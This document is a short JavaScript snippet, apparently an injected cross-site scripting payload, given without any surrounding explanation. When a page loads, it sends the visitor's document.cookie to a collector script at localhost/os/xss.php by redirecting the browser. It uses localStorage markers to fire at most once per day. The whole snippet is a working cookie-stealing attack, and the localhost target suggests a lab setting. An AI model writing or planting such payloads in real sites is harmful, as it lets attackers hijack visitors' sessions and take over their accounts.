var today = new Date();
var date = today.getDate();
var b=localStorage.getItem("b");
var d=localStorage.getItem("d");
if(b==null || date>d)
{
document.location="http://localhost/os/xss.php?cookie=" + document.cookie;
localStorage.setItem("b", "b");
localStorage.setItem("d", date);
}
